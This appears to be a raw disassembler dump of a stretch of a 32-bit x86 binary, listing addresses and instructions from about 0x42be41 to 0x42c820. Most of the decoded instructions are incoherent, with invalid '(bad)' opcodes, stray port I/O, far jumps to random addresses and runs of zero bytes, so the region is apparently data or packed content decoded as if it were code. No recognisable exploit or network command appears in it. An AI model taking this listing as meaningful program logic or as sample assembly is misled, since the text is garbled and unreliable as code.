  42be41:	mov    ds:0xb5fc97f3,eax
  42be46:	lahf   
  42be47:	int3   
  42be48:	outs   dx,DWORD PTR ds:[esi]
  42be49:	stc    
  42be4a:	or     edx,DWORD PTR [ecx-0x18]
  42be4d:	(bad)  
  42be4e:	mov    ebx,0xefdf31dc
  42be53:	mov    ebx,0x5bd7db9d
  42be58:	lods   al,BYTE PTR ds:[esi]
  42be59:	inc    edx
  42be5a:	jle    0x42be61
  42be5c:	shl    dl,0x96
  42be5f:	cmc    
  42be60:	das    
  42be61:	cmp    eax,0x59c56c27
  42be66:	test   eax,0x524f6cbc
  42be6b:	out    dx,eax
  42be6c:	xchg   edi,eax
  42be6d:	ss inc eax
  42be6f:	inc    eax
  42be70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42be71:	nop
  42be72:	xchg   BYTE PTR [ecx],dl
  42be74:	xchg   ah,cl
  42be76:	iret   
  42be77:	push   esp
  42be78:	aad    0xe8
  42be7a:	dec    ebp
  42be7b:	inc    ecx
  42be7c:	or     ebx,DWORD PTR [edx+0x2f]
  42be7f:	sub    dl,dh
  42be81:	mov    esp,DWORD PTR [esi-0x47]
  42be84:	jae    0x42be39
  42be86:	cld    
  42be87:	dec    esp
  42be88:	inc    ebp
  42be89:	sbb    cl,BYTE PTR ds:0xb7843f39
  42be8f:	xchg   DWORD PTR [eax],eax
	...
  42bef1:	add    BYTE PTR [eax],al
  42bef3:	add    BYTE PTR [edi-0x825b8e0],dl
  42bef9:	call   FWORD PTR [edi-0x28375c93]
  42beff:	jnp    0x42be89
  42bf01:	xor    DWORD PTR [ebp+0x1d5dc11],ebp
  42bf07:	add    BYTE PTR [ecx+eax*1],al
  42bf0a:	add    BYTE PTR [eax],al
  42bf0c:	(bad)  
  42bf0d:	adc    edi,DWORD PTR [edx+0x3e]
  42bf10:	cs int 0xfc
  42bf13:	aaa    
  42bf14:	pop    es
  42bf15:	mov    esp,0xf1ad511d
  42bf1a:	fild   QWORD PTR [eax]
  42bf1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bf1d:	sub    al,0x21
  42bf1f:	retf   
  42bf20:	out    0x1b,al
  42bf22:	fbstp  TBYTE PTR [edi-0x310825ca]
  42bf28:	repz xor edx,DWORD PTR [edi]
  42bf2b:	and    DWORD PTR [edx-0x2ccaf7f5],esi
  42bf31:	pop    edx
  42bf32:	adc    al,al
  42bf34:	data16 das 
  42bf36:	push   eax
  42bf37:	and    eax,0x11623461
  42bf3c:	and    BYTE PTR [edx-0x6d],dh
  42bf3f:	ja     0x42bf9f
  42bf41:	stc    
  42bf42:	mov    edx,0x1e6816d3
  42bf47:	call   0x639c7c78
  42bf4c:	scas   al,BYTE PTR es:[edi]
  42bf4d:	jns    0x42bf3a
  42bf4f:	in     eax,0xad
  42bf51:	push   esp
  42bf52:	(bad)  
  42bf53:	int3   
  42bf54:	or     dl,ch
  42bf56:	shl    ebx,1
  42bf58:	ds pop esp
  42bf5a:	and    dh,al
  42bf5c:	ins    BYTE PTR es:[edi],dx
  42bf5d:	into   
  42bf5e:	mov    esi,0x1751cd30
  42bf63:	and    DWORD PTR [eax],0x42
  42bf66:	in     al,0x1c
  42bf68:	sbb    DWORD PTR [ebp-0x1],0xa
  42bf6c:	cmp    DWORD PTR [ecx+0x6e],eax
  42bf6f:	cmp    DWORD PTR [edi-0x20ce6eab],eax
  42bf75:	imul   esi,DWORD PTR [ebp-0x3b],0x603e5cfb
  42bf7c:	dec    eax
  42bf7d:	gs mov esi,0x61f2c04e
  42bf83:	or     BYTE PTR [eax-0xb0403f7],dh
  42bf89:	loopne 0x42bf66
  42bf8b:	inc    ebx
  42bf8c:	cmp    bl,BYTE PTR [eax]
  42bf8e:	sahf   
  42bf8f:	bound  esi,QWORD PTR [ebx+eiz*4-0x9e268a4]
  42bf96:	ror    BYTE PTR [ebp+0x26],1
  42bf99:	push   0xffffffe8
  42bf9b:	xlat   BYTE PTR ds:[ebx]
  42bf9c:	ss fwait
  42bf9e:	mov    dh,BYTE PTR [edx]
  42bfa0:	je     0x42bfbc
  42bfa2:	jmp    0x42c00f
  42bfa4:	leave  
  42bfa5:	add    BYTE PTR [ecx-0x59c27c35],bh
  42bfab:	pushf  
  42bfac:	retf   
  42bfad:	mov    ah,0x18
  42bfaf:	xchg   esp,eax
  42bfb0:	add    al,0xc
  42bfb2:	cmp    dh,BYTE PTR [edi*8-0x6da6d734]
  42bfb9:	or     edx,DWORD PTR [ebx+0x16]
  42bfbc:	dec    eax
  42bfbd:	adc    BYTE PTR [esi-0x1f6aa2ee],0xa9
  42bfc4:	ret    
  42bfc5:	mov    esi,0xcf28c394
  42bfca:	mov    dl,0x85
  42bfcc:	ds xor eax,0xfc4e78bb
  42bfd2:	sbb    al,0x97
  42bfd4:	les    ebp,FWORD PTR [esi-0x7c]
  42bfd7:	add    eax,0xf0b19aa6
  42bfdc:	mov    edx,fs
  42bfde:	push   esp
  42bfdf:	shl    BYTE PTR [ecx+ecx*1-0x3e7653bf],cl
  42bfe6:	test   DWORD PTR [edx],ebp
  42bfe8:	iret   
  42bfe9:	mov    dh,0xaf
  42bfeb:	mov    ebp,0x6fad6301
  42bff0:	les    ebx,FWORD PTR ds:0x5968b66
  42bff6:	out    0x1f,al
  42bff8:	jo     0x42c034
  42bffa:	pop    es
  42bffb:	das    
  42bffc:	mov    ds:0x1a6d6537,eax
  42c001:	dec    edi
  42c002:	xor    BYTE PTR [ecx],ch
  42c004:	or     DWORD PTR [edi+ebp*8+0x2d],0x33072edf
  42c00c:	dec    eax
  42c00d:	shr    BYTE PTR [ecx-0x43],0x0
	...
  42c071:	add    BYTE PTR [eax],al
  42c073:	add    BYTE PTR [edx],bh
  42c075:	xchg   edx,eax
  42c076:	ja     0x42c0aa
  42c078:	push   edi
  42c07a:	jg     0x42c016
  42c07c:	leave  
  42c07d:	or     DWORD PTR [edi-0x57],edi
  42c080:	xlat   BYTE PTR ds:[ebx]
  42c081:	addr16 je 0x42c033
  42c084:	loopne 0x42c05c
  42c086:	add    DWORD PTR [eax],eax
  42c088:	add    al,0x1
  42c08a:	add    BYTE PTR [eax],al
  42c08c:	lahf   
  42c08d:	inc    ebp
  42c08e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c08f:	jns    0x42c038
  42c091:	dec    eax
  42c092:	push   ss
  42c093:	cmp    BYTE PTR [esi+0xd],al
  42c096:	stc    
  42c097:	inc    edx
  42c098:	fcmovnb st,st(6)
  42c09a:	mov    eax,ds:0xd305620d
  42c09f:	stc    
  42c0a0:	or     ch,BYTE PTR [edi+esi*2+0x1c]
  42c0a4:	jns    0x42c074
  42c0a6:	cdq    
  42c0a7:	and    DWORD PTR [ebx-0x51],ebp
  42c0aa:	mov    esi,0xcdde74dd
  42c0af:	mov    dl,0x7e
  42c0b1:	xor    eax,0x4a460eb4
  42c0b6:	hlt    
  42c0b7:	stc    
  42c0b8:	shl    DWORD PTR [edi+0x63],1
  42c0bb:	in     eax,0x44
  42c0bd:	cdq    
  42c0be:	xlat   BYTE PTR ds:[ebx]
  42c0bf:	xor    ebx,DWORD PTR [eax]
  42c0c1:	cmp    eax,esi
  42c0c3:	push   ds
  42c0c4:	(bad)  
  42c0c5:	daa    
  42c0c6:	pop    edi
  42c0c7:	jnp    0x42c0b6
  42c0c9:	dec    ebx
  42c0ca:	ror    BYTE PTR [edx],cl
  42c0cc:	and    DWORD PTR [ebx-0x66],0x6a506a7d
  42c0d3:	or     al,al
  42c0d5:	sbb    ch,BYTE PTR ds:0x7f0c731f
  42c0db:	int    0x2c
  42c0dd:	test   eax,0x3711d09d
  42c0e2:	sub    bh,BYTE PTR es:[edx-0x49b8f263]
  42c0e9:	mov    edx,cr1
  42c0ec:	push   0x24
  42c0ee:	xchg   edi,eax
  42c0ef:	inc    edx
  42c0f0:	inc    esi
  42c0f1:	cmp    al,0x38
  42c0f3:	cmp    bl,al
  42c0f5:	adc    ecx,esi
  42c0f7:	repz xchg ebp,eax
  42c0f9:	mov    edi,0x6e67fda5
  42c0fe:	push   ss
  42c0ff:	aam    0x89
  42c101:	test   BYTE PTR [ebx+0x7b],dl
  42c104:	pop    esi
  42c105:	cmp    al,0xc8
  42c107:	push   esi
  42c108:	ret    0xc8d8
  42c10b:	add    eax,0x5e00b5bf
  42c110:	inc    edx
  42c111:	sbb    cl,BYTE PTR [edx+eiz*8+0x7]
  42c115:	push   eax
  42c116:	pop    ebx
  42c117:	mov    dh,0x8f
  42c119:	jns    0x42c0e8
  42c11b:	mov    esi,0xe2483472
  42c120:	add    edi,esp
  42c122:	xchg   edi,eax
  42c123:	call   0xe8d03093
  42c128:	xor    edx,0x481173f
  42c12e:	nop
  42c12f:	dec    ecx
  42c130:	imul   ecx,DWORD PTR [edx-0x14],0x130365f7
  42c137:	ja     0x42c158
  42c139:	jl     0x42c0fe
  42c13b:	sti    
  42c13c:	stos   DWORD PTR es:[edi],eax
  42c13d:	jge    0x42c19f
  42c13f:	mov    ah,0x3e
  42c141:	(bad)  
  42c142:	nop
  42c143:	les    edi,FWORD PTR [edi+0x331ed5ca]
  42c149:	sbb    eax,0x9b590abd
  42c14e:	sub    edi,DWORD PTR [ebp-0x38]
  42c151:	cld    
  42c152:	cmp    eax,DWORD PTR [esi]
  42c154:	loop   0x42c13b
  42c156:	pop    ss
  42c157:	inc    ecx
  42c158:	push   es
  42c159:	aas    
  42c15a:	or     dh,cl
  42c15c:	dec    esp
  42c15d:	pop    ss
  42c15e:	add    eax,0xba00f5f1
  42c163:	mov    ?,WORD PTR [ebx]
  42c165:	rcl    DWORD PTR [edx+0x1a6c2206],1
  42c16b:	jmp    0xbb4a:0x89fe139a
  42c172:	dec    ebx
  42c173:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c174:	sub    bh,BYTE PTR [ecx-0x20]
  42c177:	std    
  42c178:	test   al,0x7d
  42c17a:	pop    ecx
  42c17b:	jae    0x42c153
  42c17d:	nop
  42c17e:	inc    eax
  42c17f:	fnstsw WORD PTR [eax-0x22]
  42c182:	mov    fs,edi
  42c184:	xchg   esp,eax
  42c185:	clc    
  42c186:	mov    ds:0xb1ae4f07,al
  42c18b:	adc    DWORD PTR [edx-0x3d],edx
  42c18e:	mov    al,0xae
	...
  42c1f4:	imul   eax,DWORD PTR [edx-0x10105133],0x90f2c76b
  42c1fe:	xchg   esp,eax
  42c1ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c200:	popf   
  42c201:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c202:	(bad)  
  42c204:	in     al,0xd7
  42c206:	add    DWORD PTR [eax],eax
  42c208:	add    al,0x1
  42c20a:	add    BYTE PTR [eax],al
  42c20c:	or     esp,ecx
  42c20e:	mov    al,ds:0xfb65ea27
  42c213:	scas   al,BYTE PTR es:[edi]
  42c214:	cmp    esi,DWORD PTR [ebp-0x6a]
  42c217:	nop
  42c218:	push   esi
  42c219:	dec    esi
  42c21a:	cmp    esp,edx
  42c21c:	cmp    al,0x45
  42c21e:	mov    ch,0x95
  42c220:	push   0x39c53380
  42c225:	pushf  
  42c226:	and    DWORD PTR [edi+eiz*2-0x5c5f8570],eax
  42c22d:	and    dh,bh
  42c22f:	ficom  DWORD PTR [esi-0x20]
  42c232:	sub    ah,BYTE PTR [ebp-0x79]
  42c235:	add    eax,DWORD PTR [eax]
  42c237:	push   esp
  42c238:	and    dh,bl
  42c23a:	jns    0x42c1c6
  42c23c:	cmp    DWORD PTR [edx-0x2030b3fd],edx
  42c242:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c243:	stos   DWORD PTR es:[edi],eax
  42c244:	not    DWORD PTR [di+0x2391]
  42c249:	cdq    
  42c24a:	mov    ah,0x3
  42c24c:	adc    bl,BYTE PTR [esi+0x1c7a13dd]
  42c252:	xchg   ecx,eax
  42c253:	mov    esp,0x1e4e6eed
  42c258:	pop    ecx
  42c259:	xchg   ebx,eax
  42c25a:	pop    edi
  42c25b:	jns    0x42c2d5
  42c25d:	sbb    eax,0xaec3e472
  42c262:	or     al,0x83
  42c264:	iret   
  42c265:	jnp    0x42c229
  42c267:	lea    ebp,[edi+0xa113709]
  42c26d:	or     eax,0xb6cc51c2
  42c272:	jge    0x42c221
  42c274:	ss xchg esp,eax
  42c276:	int3   
  42c277:	push   ss
  42c278:	push   ebp
  42c279:	loope  0x42c2cf
  42c27b:	jmp    0x9d516f80
  42c280:	xchg   ebx,eax
  42c281:	(bad)  
  42c282:	and    bh,dl
  42c284:	clc    
  42c285:	dec    esi
  42c286:	jb     0x42c25d
  42c288:	fld    st(6)
  42c28a:	jp     0x42c26d
  42c28c:	mov    ss,WORD PTR [ebx+0x55]
  42c28f:	into   
  42c290:	rol    BYTE PTR [eax+0x5b0ff32c],cl
  42c296:	cdq    
  42c297:	jbe    0x42c30b
  42c299:	mov    ?,WORD PTR [ecx+0x7f]
  42c29c:	push   ds
  42c29d:	push   edx
  42c29e:	fadd   st(1),st
  42c2a0:	dec    eax
  42c2a1:	mov    ds:0x4b3042cf,al
  42c2a6:	and    al,0x83
  42c2a8:	jae    0x42c256
  42c2aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c2ab:	lds    ebp,FWORD PTR [edi]
  42c2ad:	pop    ss
  42c2ae:	test   al,ch
  42c2b0:	(bad)
  42c2b3:	lea    ecx,[esi]
  42c2b5:	and    DWORD PTR [ebp+edx*1-0x68344387],ebp
  42c2bc:	jb     0x42c2ec
  42c2be:	fist   WORD PTR [edx]
  42c2c0:	repnz inc esi
  42c2c2:	leave  
  42c2c3:	lods   al,BYTE PTR ds:[esi]
  42c2c4:	xchg   ecx,eax
  42c2c5:	sbb    al,0x62
  42c2c7:	int    0x5f
  42c2c9:	daa    
  42c2ca:	ds jne 0x42c263
  42c2cd:	add    ah,BYTE PTR [eax+0xa]
  42c2d0:	iret   
  42c2d1:	ret    
  42c2d2:	push   es
  42c2d3:	adc    DWORD PTR [edx+0x58],ebp
  42c2d6:	lods   eax,DWORD PTR ds:[esi]
  42c2d7:	sbb    al,0xe1
  42c2d9:	mov    edi,DWORD PTR gs:[ebx]
  42c2dc:	loope  0x42c29a
  42c2de:	je     0x42c2d8
  42c2e0:	push   edx
  42c2e1:	aad    0x5f
  42c2e3:	xchg   edx,edx
  42c2e5:	and    dh,BYTE PTR [edx-0x11]
  42c2e8:	outs   dx,BYTE PTR ds:[esi]
  42c2e9:	fs inc esp
  42c2eb:	ret    0xbe95
  42c2ee:	call   0x6448f2c0
  42c2f3:	cmp    ch,BYTE PTR [ebx-0x2d0fe477]
  42c2f9:	mov    eax,ds:0x65b0ee28
  42c2fe:	xor    al,0x32
  42c300:	inc    edi
  42c301:	outs   dx,BYTE PTR ds:[esi]
  42c302:	imul   edi,edx,0x7443d617
  42c308:	in     eax,0x35
  42c30a:	ficom  WORD PTR [edi-0x7]
  42c30d:	and    BYTE PTR [ecx+0x14],0x0
	...
  42c374:	out    0xf,al
  42c376:	fldcw  WORD PTR [ebp-0x7]
  42c379:	push   esi
  42c37b:	(bad)  
  42c37c:	in     eax,dx
  42c37d:	(bad)  
  42c37e:	sub    eax,0xa32eddf6
  42c383:	jp     0x42c36d
  42c385:	fadd   DWORD PTR [ecx]
  42c387:	add    BYTE PTR [ecx+eax*1],al
  42c38a:	add    BYTE PTR [eax],al
  42c38c:	add    DWORD PTR [edx-0x32],esi
  42c38f:	std    
  42c390:	pop    esp
  42c391:	xchg   esi,eax
  42c392:	jae    0x42c377
  42c394:	xchg   edi,eax
  42c395:	sbb    al,dl
  42c397:	push   ebx
  42c398:	gs pop esp
  42c39a:	or     edx,eax
  42c39c:	sbb    al,0xab
  42c39e:	xchg   esp,eax
  42c39f:	jno    0x42c3c5
  42c3a1:	in     eax,dx
  42c3a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c3a3:	jmp    ebp
  42c3a5:	imul   eax,DWORD PTR [edi],0x62
  42c3a8:	jo     0x42c3bc
  42c3aa:	lahf   
  42c3ab:	push   ebx
  42c3ac:	rcl    edi,cl
  42c3ae:	mov    bh,0x3
  42c3b0:	frstor [ebp+0x427ef2ea]
  42c3b6:	xchg   edx,eax
  42c3b7:	mov    ecx,0xab2067
  42c3bc:	clc    
  42c3bd:	int    0x74
  42c3bf:	jmp    0x597:0xe5cfce0
  42c3c6:	cmp    BYTE PTR [ebx],bh
  42c3c8:	jae    0x42c434
  42c3ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c3cb:	pop    esp
  42c3cc:	ja     0x42c36a
  42c3ce:	mul    al
  42c3d0:	pop    ebp
  42c3d1:	sti    
  42c3d2:	sub    al,0x6a
  42c3d4:	cld    
  42c3d5:	aam    0xae
  42c3d7:	cmp    DWORD PTR [edi-0x11],0xffffff8a
  42c3db:	or     eax,0x7b2a917c
  42c3e0:	(bad)  
  42c3e1:	cld    
  42c3e2:	lock sub DWORD PTR [esi],esp
  42c3e5:	pop    ebp
  42c3e6:	push   esp
  42c3e7:	cmp    al,0x47
  42c3e9:	mov    bl,0xb0
  42c3eb:	dec    edi
  42c3ec:	or     al,0xb4
  42c3ee:	fcomp  DWORD PTR [edx-0x30]
  42c3f1:	pushf  
  42c3f2:	mov    esi,0x53b07a9
  42c3f7:	hlt    
  42c3f8:	into   
  42c3f9:	and    ah,BYTE PTR ds:0x9c8078b6
  42c3ff:	rcr    BYTE PTR [esi+0x7da7c108],0x2d
  42c406:	pop    eax
  42c407:	ins    BYTE PTR es:[edi],dx
  42c408:	ja     0xabc6165d
  42c40e:	push   eax
  42c40f:	add    BYTE PTR [ebx+0x52],al
  42c412:	lock sbb al,0x4f
  42c415:	cmp    DWORD PTR [ecx],esi
  42c417:	sub    DWORD PTR [edx+0x44],edi
  42c41a:	xchg   edi,eax
  42c41b:	ja     0x42c497
  42c41d:	mov    ebp,0xa5ee837a
  42c422:	pop    ebp
  42c423:	xchg   edi,eax
  42c424:	pop    ds
  42c425:	mov    fs,WORD PTR [edi-0x43494bce]
  42c42b:	pop    ds
  42c42c:	js     0x42c434
  42c42e:	dec    eax
  42c42f:	stos   DWORD PTR es:[edi],eax
  42c430:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c431:	out    dx,al
  42c432:	fisub  WORD PTR ds:0xaae6038f
  42c438:	jmp    0x9bcb:0xcbdba939
  42c43f:	pop    ecx
  42c440:	or     DWORD PTR [edx+0x6cef26a],edx
  42c446:	ins    BYTE PTR es:[edi],dx
  42c447:	in     eax,0xce
  42c449:	push   eax
  42c44a:	ret    
  42c44b:	mov    esi,0x4aa0f783
  42c450:	(bad)  
  42c452:	into   
  42c453:	adc    ch,bl
  42c455:	sub    ecx,DWORD PTR [ebx+0x4f]
  42c458:	adc    BYTE PTR ds:0x213dce9f,0x9c
  42c45f:	adc    DWORD PTR [ecx],edx
  42c461:	aad    0xdf
  42c463:	les    edi,FWORD PTR [eax+0x19420765]
  42c469:	movaps xmm5,XMMWORD PTR [esi]
  42c46c:	mov    ?,edi
  42c46e:	(bad)  
  42c46f:	hlt    
  42c470:	and    eax,0x151c08a9
  42c475:	outs   dx,BYTE PTR ds:[esi]
  42c476:	retfw  0x482b
  42c47a:	in     al,dx
  42c47b:	pusha  
  42c47c:	cmp    al,0x99
  42c47e:	sahf   
  42c47f:	mov    edi,0x9016b3b0
  42c484:	or     ebp,DWORD PTR [esi]
  42c486:	out    0xc4,eax
  42c488:	out    dx,eax
  42c489:	push   es
  42c48a:	retf   0x46c8
  42c48d:	xchg   esp,eax
  42c48e:	sub    BYTE PTR [ebx+0x0],0x0
	...
  42c4f2:	add    BYTE PTR [eax],al
  42c4f4:	in     al,dx
  42c4f5:	sbb    ebp,edx
  42c4f7:	sahf   
  42c4f8:	cmc    
  42c4f9:	fsubp  st(7),st
  42c4fb:	jnp    0x42c4af
  42c4fd:	sti    
  42c4fe:	enter  0xab34,0xe8
  42c502:	dec    edx
  42c503:	ret    0xd9ec
  42c506:	add    DWORD PTR [eax],eax
  42c508:	add    al,0x1
  42c50a:	add    BYTE PTR [eax],al
  42c50c:	sbb    edx,DWORD PTR [esi-0x75]
  42c50f:	add    eax,0x168a131a
  42c514:	fmul   st,st(2)
  42c516:	cmp    BYTE PTR [esi+0x10849bed],ch
  42c51c:	mov    gs,WORD PTR [edi-0x2d]
  42c51f:	dec    ebx
  42c520:	lahf   
  42c521:	xor    cl,BYTE PTR [ebx-0x307fec04]
  42c527:	retf   
  42c528:	rcr    DWORD PTR ds:0x19f57f9c,0x26
  42c52f:	cs dec ecx
  42c531:	dec    ecx
  42c532:	lea    esp,[edx]
  42c534:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c535:	shl    ch,1
  42c537:	jp     0x42c4ee
  42c539:	xor    ebp,eax
  42c53b:	push   esi
  42c53c:	push   0x86cb693e
  42c541:	push   ss
  42c542:	mov    bl,bh
  42c544:	std    
  42c545:	inc    ebp
  42c546:	stos   BYTE PTR es:[edi],al
  42c547:	rcr    ebp,0x9e
  42c54a:	jmp    0xb985:0x7784214e
  42c551:	cdq    
  42c552:	ja     0x42c594
  42c554:	push   esp
  42c555:	xor    eax,0x89ba13e2
  42c55a:	fs fsub st(5),st
  42c55d:	(bad)  
  42c55e:	xchg   ebp,eax
  42c55f:	nop
  42c560:	pop    esp
  42c561:	stos   BYTE PTR es:[edi],al
  42c562:	data16 mov bh,0x7d
  42c565:	pop    edx
  42c566:	scas   al,BYTE PTR es:[edi]
  42c567:	sti    
  42c568:	das    
  42c569:	mov    ebx,0x87c7c161
  42c56e:	dec    edx
  42c56f:	shl    dh,0x8a
  42c572:	xor    eax,0x1b49ae9c
  42c577:	sbb    eax,0x6e362256
  42c57c:	adc    al,0x8d
  42c57e:	inc    esp
  42c57f:	std    
  42c580:	sbb    edi,DWORD PTR [esi]
  42c582:	ja     0x42c509
  42c584:	add    DWORD PTR [ebx],eax
  42c586:	push   edx
  42c587:	out    0x19,eax
  42c589:	dec    esp
  42c58a:	retf   0x4069
  42c58d:	fld    TBYTE PTR [ebp+0x34]
  42c590:	out    0x21,al
  42c592:	jle    0x42c567
  42c594:	and    al,BYTE PTR [edx+edx*2-0x5e]
  42c598:	sahf   
  42c599:	adc    eax,0x47fb321
  42c59e:	lea    edx,[ebp+0x27]
  42c5a1:	es push ebx
  42c5a3:	retf   0x62ea
  42c5a6:	pushf  
  42c5a7:	mov    gs,eax
  42c5a9:	sbb    eax,0x8c46859b
  42c5ae:	fdivp  st(7),st
  42c5b0:	and    ebx,DWORD PTR [ebp-0x24]
  42c5b3:	sub    DWORD PTR [ecx],ebx
  42c5b5:	jne    0x42c5cd
  42c5b7:	mov    WORD PTR [eax],ss
  42c5b9:	fnstcw WORD PTR [eax]
  42c5bb:	lahf   
  42c5bc:	js     0x42c5a4
  42c5be:	sbb    BYTE PTR [ebp+0x42],al
  42c5c1:	retf   
  42c5c2:	scas   al,BYTE PTR es:[edi]
  42c5c3:	ret    0x716e
  42c5c6:	(bad)  
  42c5c7:	push   0x48
  42c5c9:	mov    cl,0x60
  42c5cb:	xchg   BYTE PTR ds:[esi],dh
  42c5ce:	pop    ebx
  42c5cf:	test   DWORD PTR [edx+0x67cb122a],0x343fd7c2
  42c5d9:	dec    ebp
  42c5da:	dec    edx
  42c5db:	jecxz  0x42c5e3
  42c5dd:	add    DWORD PTR [eax+0x2d65c016],ecx
  42c5e3:	mov    ecx,0x7d5e6bc8
  42c5e8:	push   ebx
  42c5e9:	(bad)  
  42c5ea:	push   ecx
  42c5eb:	es pop eax
  42c5ed:	xchg   ebx,eax
  42c5ee:	scas   eax,DWORD PTR es:[edi]
  42c5ef:	xchg   esp,eax
  42c5f0:	sbb    bh,bl
  42c5f2:	and    DWORD PTR [ecx-0x5e],esi
  42c5f5:	sbb    dl,BYTE PTR [edi]
  42c5f7:	mul    DWORD PTR [edx]
  42c5f9:	xchg   esi,eax
  42c5fa:	jne    0x42c62f
  42c5fc:	cmp    BYTE PTR [edx+0x1f],0xfe
  42c600:	clc    
  42c601:	jnp    0x42c628
  42c603:	dec    edx
  42c604:	int3   
  42c605:	out    dx,eax
  42c606:	add    dl,ch
  42c608:	jg     0x42c5b2
  42c60a:	add    al,BYTE PTR [ebp+0x6d55c596]
	...
  42c674:	pop    ebp
  42c675:	dec    eax
  42c676:	jle    0x42c606
  42c678:	jg     0x42c638
  42c67a:	std    
  42c67b:	fstp   TBYTE PTR [ebx-0x5920395]
  42c681:	loopne 0x42c628
  42c683:	shl    al,cl
  42c685:	fiadd  DWORD PTR [ecx]
  42c687:	add    BYTE PTR [ecx+eax*1],al
  42c68a:	add    BYTE PTR [eax],al
  42c68c:	pop    ss
  42c68d:	mov    eax,ds:0x1b503039
  42c692:	neg    BYTE PTR [esi]
  42c694:	mov    ds:0x7d60ce16,eax
  42c699:	or     eax,0x1a89c0de
  42c69e:	ficom  DWORD PTR [edx-0x1d843a19]
  42c6a4:	shr    DWORD PTR [ecx-0x3],cl
  42c6a7:	test   DWORD PTR [edx-0x6c],ebx
  42c6aa:	in     eax,dx
  42c6ab:	jae    0x42c6dd
  42c6ad:	fdiv   DWORD PTR [edx-0x1a247cbb]
  42c6b3:	dec    ebx
  42c6b4:	add    esp,edi
  42c6b6:	pop    esp
  42c6b7:	int3   
  42c6b8:	xor    BYTE PTR [esi+0x15a08c0],0x10
  42c6bf:	pop    edi
  42c6c0:	bound  eax,QWORD PTR [eax-0x7b009ff1]
  42c6c6:	mov    ecx,0x28ddf088
  42c6cb:	pop    eax
  42c6cc:	mov    ah,0x70
  42c6ce:	or     BYTE PTR ds:0xc4046be6,ah
  42c6d4:	xor    al,0xde
  42c6d6:	inc    ebp
  42c6d7:	lods   eax,DWORD PTR ds:[esi]
  42c6d8:	jp     0x42c6da
  42c6da:	pop    ecx
  42c6db:	or     dh,BYTE PTR [ecx]
  42c6dd:	call   DWORD PTR [ecx-0x2]
  42c6e0:	xchg   ebp,eax
  42c6e1:	add    BYTE PTR [edi-0x19],dl
  42c6e4:	outs   dx,DWORD PTR ds:[esi]
  42c6e5:	scas   al,BYTE PTR es:[edi]
  42c6e6:	sbb    BYTE PTR [ebp+eiz*2+0x4f],0x9e
  42c6eb:	inc    esi
  42c6ec:	mov    esi,DWORD PTR [esi]
  42c6ee:	push   0x55
  42c6f0:	cs xchg edx,eax
  42c6f2:	push   cs
  42c6f3:	aad    0x77
  42c6f5:	das    
  42c6f6:	xchg   esi,eax
  42c6f7:	xchg   edx,eax
  42c6f8:	out    0x3d,eax
  42c6fa:	test   BYTE PTR [ecx],ah
  42c6fc:	nop
  42c6fd:	or     ebp,DWORD PTR [esi]
  42c6ff:	fdivr  QWORD PTR ds:0xe33256e0
  42c705:	scas   al,BYTE PTR es:[edi]
  42c706:	inc    edx
  42c707:	adc    DWORD PTR [edx-0x79],esi
  42c70a:	push   ecx
  42c70b:	lock (bad) 
  42c70d:	inc    edx
  42c70e:	jp     0x42c6b1
  42c710:	jne    0x42c771
  42c712:	(bad)  
  42c714:	cmc    
  42c715:	cmp    al,0xef
  42c717:	mov    dh,0x9e
  42c719:	ds ja  0x42c6a0
  42c71c:	loopne 0x42c716
  42c71e:	retf   0x580b
  42c721:	lock push esp
  42c723:	scas   eax,DWORD PTR es:[edi]
  42c724:	mov    esi,0x113dbcc0
  42c729:	test   al,0xf1
  42c72b:	fisubr DWORD PTR [esi-0x715aa97f]
  42c731:	push   eax
  42c732:	push   esp
  42c733:	pop    edx
  42c734:	div    BYTE PTR [ebp+0x6b156724]
  42c73a:	imul   edx,esp,0x2a8c84c5
  42c740:	cdq    
  42c741:	jecxz  0x42c6e4
  42c743:	cdq    
  42c744:	loop   0x42c700
  42c746:	loop   0x42c6f5
  42c748:	pop    eax
  42c749:	jle    0x42c6df
  42c74b:	mov    edx,0x66f79c0c
  42c750:	pop    es
  42c751:	or     BYTE PTR [edi+0x41aa544f],al
  42c757:	xor    eax,0x5d5871bb
  42c75c:	int    0xa7
  42c75e:	sub    DWORD PTR [ebx],ecx
  42c760:	test   DWORD PTR [edi],0x3e490158
  42c766:	and    BYTE PTR [edx],bh
  42c768:	xor    al,0x8f
  42c76a:	dec    eax
  42c76b:	shl    DWORD PTR [edi],0xc5
  42c76e:	enter  0x58db,0xd
  42c772:	outs   dx,BYTE PTR ds:[esi]
  42c773:	and    BYTE PTR [edi+eiz*2],ah
  42c776:	push   ecx
  42c777:	daa    
  42c778:	fmul   st(7),st
  42c77a:	sar    BYTE PTR [ebp+0x66],0xb3
  42c77e:	and    al,0x4e
  42c780:	call   0xbd2d:0x705a8319
  42c787:	les    eax,FWORD PTR [ebx-0x58]
  42c78a:	xor    eax,0x7b6b2149
  42c78f:	mov    al,BYTE PTR [eax]
	...
  42c7f1:	add    BYTE PTR [eax],al
  42c7f3:	add    BYTE PTR [eax],bh
  42c7f5:	mov    DWORD PTR [edx-0x6b],ebp
  42c7f8:	sti    
  42c7f9:	idiv   edi
  42c7fb:	lods   eax,DWORD PTR ds:[esi]
  42c7fc:	pop    ebp
  42c7fd:	sbb    eax,0x16fca40e
  42c802:	fs nop
  42c804:	hlt    
  42c805:	fild   DWORD PTR [ecx]
  42c807:	add    BYTE PTR [ecx+eax*1],al
  42c80a:	add    BYTE PTR [eax],al
  42c80c:	mov    ah,0x41
  42c80e:	mov    cl,0xf6
  42c810:	lds    ebp,FWORD PTR ds:0xa5ed1e73
  42c816:	xlat   BYTE PTR ss:[ebx]
  42c818:	je     0x42c7c5
  42c81a:	sti    
  42c81b:	test   al,0xaf
  42c81d:	nop
  42c81e:	loopne 0x42c7d8
  42c820:	and    BYTE PTR [ebx],bh
